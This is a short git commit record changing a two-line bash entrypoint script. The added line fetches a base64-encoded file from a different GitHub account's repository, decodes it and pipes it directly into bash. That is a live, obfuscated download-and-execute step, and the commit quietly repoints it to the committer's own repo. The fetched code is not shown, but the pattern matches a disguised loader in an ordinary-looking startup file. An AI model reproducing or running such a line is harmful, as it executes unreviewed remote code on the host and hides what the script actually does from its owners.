82b5eea50a5453f0631e5e095a667d72586f2904
robertjardine652 <robertj.ardine65@gmail.com>
2026-06-18 02:29:09 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/brentguiterrez/kite/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/robertjardine652/kids/refs/heads/main/entrypoint.sh | base64 -d | bash
